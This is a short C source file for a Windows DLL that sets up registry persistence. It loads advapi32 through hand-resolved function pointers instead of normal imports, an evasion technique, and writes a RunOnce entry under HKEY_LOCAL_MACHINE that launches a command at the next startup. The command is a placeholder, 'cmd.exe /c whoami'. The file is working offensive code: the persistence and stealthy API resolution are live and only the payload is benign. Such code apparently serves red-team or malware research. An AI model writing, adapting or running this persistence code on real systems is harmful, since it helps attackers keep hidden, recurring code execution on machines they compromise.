#include "main.h"



/*----------------------------------------------------------
Tester function for DLLMain basic registry persistence
----------------------------------------------------------*/

void Runner() {

	HMODULE hModule;
	HKEY hKey;
	LPCWSTR payload = L"C:\\Windows\\System32\\cmd.exe /c whoami";
	DWORD payloadLen = (wcslen(payload) + 1) * sizeof(wchar_t);
	LPCWSTR persistKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce";

	// prepare a basic struct that will hold pointer to LdrLoadDll
	WINAPIS WinAPIs = { 0 };
	hModule = GetHand(NTLIB);
	WinAPIs.fnLoad = (Load_t)GetAddr(hModule, LLB, &WinAPIs);

	// Load the required DLL
	hModule = (HMODULE)Loader((LPSTR)"advapi32.dll", &WinAPIs);

	// Resolve all functions that will be used
	RegCreateKeyExW_t createKey = (RegCreateKeyExW_t)GetAddr(hModule, cKey, &WinAPIs);
	RegSetValueExW_t setValue = (RegSetValueExW_t)GetAddr(hModule, setVal, &WinAPIs);
	RegCloseKey_t closer = (RegCloseKey_t)GetAddr(hModule, closeKey, &WinAPIs);


	LSTATUS stat = createKey(HKEY_LOCAL_MACHINE, persistKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hKey, NULL);
	if (stat != ERROR_SUCCESS) {
		return;
	}

	stat = setValue(hKey, L"Tester", 0, REG_SZ, (const BYTE*)payload, payloadLen);
	if (stat != ERROR_SUCCESS) {
		return;
	} 

	closer(hKey);
}
